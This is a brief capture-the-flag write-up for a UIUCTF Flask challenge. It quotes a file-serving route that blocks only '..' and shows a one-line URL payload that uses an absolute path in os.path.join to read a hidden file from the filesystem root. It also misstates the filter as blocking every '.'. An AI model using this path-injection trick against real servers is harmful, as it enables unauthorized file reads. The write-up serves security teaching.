### This is uiuctf challenge 

First look at the source code:
@app.route('/getpoem')
def get_poem():
    poemname = request.args.get('name')

    if not poemname:
        return 'Please send a name query:\n' + str(os.listdir('poems')), 404

    poemdir     = os.path.join(os.getcwd(), 'poems')
    poempath    = os.path.join(poemdir, poemname) 

    if '..' in poemname:
        return 'Illegal substring detected.', 403
    
    if not os.path.exists(poempath):
        return 'File not found.', 404

    return send_file(poempath)

We can see that it written in flask, name parameter responsible for change dir and there is join string. No '.' is allow so no path travel, and the hidden_poem.txt file in root. So just simple payload:

https://security.chal.uiuc.tf/getpoem?name=%2Fhidden_poem.txt
